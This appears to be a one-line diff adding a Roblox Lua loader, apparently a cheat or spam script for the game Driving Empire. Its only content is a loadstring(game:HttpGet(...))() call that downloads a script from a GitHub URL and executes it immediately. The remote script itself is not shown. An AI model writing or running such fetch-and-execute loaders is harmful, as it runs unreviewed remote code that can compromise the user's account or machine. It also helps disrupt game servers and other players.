@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/driving-empire-rp-servers-spam0-fodb3po2l1np6p.lua"))()
